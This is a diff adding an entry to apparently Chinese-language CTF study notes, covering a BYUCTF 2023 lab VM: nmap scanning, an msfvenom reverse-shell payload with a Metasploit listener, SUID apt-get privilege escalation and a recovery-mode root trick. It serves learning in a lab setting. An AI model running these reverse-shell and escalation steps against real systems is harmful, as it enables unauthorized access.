@@ -886,3 +886,21 @@ if __name__ == '__main__':
 - https://github.com/corkami/collisions ：使两个文件有相同的hash值。此题使用了其中的一个功能：使两张png拥有相同的md5值。用法：`png.py pic1.png pic2.png`, https://github.com/corkami/collisions/blob/master/scripts/png.py ,需要下载同目录下的`png1.bin`和`png2.bing`文件。
 155. [TOR](https://github.com/BYU-CSA/BYUCTF-2023/tree/main/tor)
 - 可用此[网站](https://onionite.net/)根据fingerprint搜索其对应的OR地址。（OR address）
+156. [MI6configuration](https://danieltaylor.tk/ctf-writeups/byu-eos-ctf-w23/mi6configuration/)
+- OVA文件的部署。这类文件是虚拟机，可以用virtual box（vmware应该也可以）部署。
+- nmap命令使用
+  - `nmap -sn 192.168.56.0/24`，扫描`192.168.56.*`网段是否有机器开启。同样的功能也可以用kali的netdiscover：https://v0lk3n.github.io/writeup/ByuCTF-2023/ByuCTF2023-WriteUp#Pentest
+  - `nmap -sC -sV ip`，扫描ip处的机器的开放端口。默认是top 1000，也可以用`-p -`扫全部的。以下是类似功能的command。
+  - `nmap -A -Pn -p - ip`
+  - `nmap -Pn -sV ip`
+- Using the bash command to start a new shell with tab completion and arrow key history enabled. By default, the sh shell that you start out in will not have these features。 ssh连接时似乎默认是sh，那在sh那个shell里运行bash就能获取到有补全功能的shell了
+- 利用msf生成反弹shell payload。`msfvenom -p linux/x64/shell_reverse_tcp LHOST=host LPORT=4444 -f elf -o reverseshell`.host应为本地机器的ip，该命令会生成一个名为reverseshell的elf文件。然后使用[scp](https://www.runoob.com/linux/linux-comm-scp.html)将payload拷贝到目标机器上:`scp reverseshell remoteuser@remotehost:dir`。接下来在本地机器上搭建listener。使用msfconsole开启一个msf终端，运行以下命令：
+```
+use multi/handler
+set payload linux/x64/shell_reverse_tcp
+set LHOST localhost
+run
+```
+you can use the command show options to display the different configuration settings of the loaded module and check what they are set to.配置完成后，目标机器运行reverseshell文件即可在本地机器上获取到反弹的shell。The command shell will tell Metasploit to search the target machine for a program that will provide a more presentable interface
+- 利用具有suid的apt-get提权：https://gtfobins.github.io/gtfobins/apt-get/ 。
+- 此题的虚拟机由我们自己设置，对于能接触到物理机器的情况。在虚拟机启动时按住shift，进入bootloader menu。然后选择recovery mode，在弹出的选项中选择drop to root shell prompt，即可获取root权限。或者参考[Unintend Solution to MI6Config](https://themj0ln1r.github.io/posts/byuctf23)
